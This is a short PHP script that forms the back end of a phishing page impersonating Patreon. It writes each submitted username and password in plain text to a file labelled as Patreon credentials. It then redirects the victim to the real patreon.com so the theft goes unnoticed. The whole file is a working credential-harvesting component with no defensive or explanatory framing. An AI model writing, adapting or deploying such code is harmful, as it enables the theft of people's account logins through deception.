<?php
file_put_contents("usernames.txt", "Patreon Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.patreon.com');
exit();
?>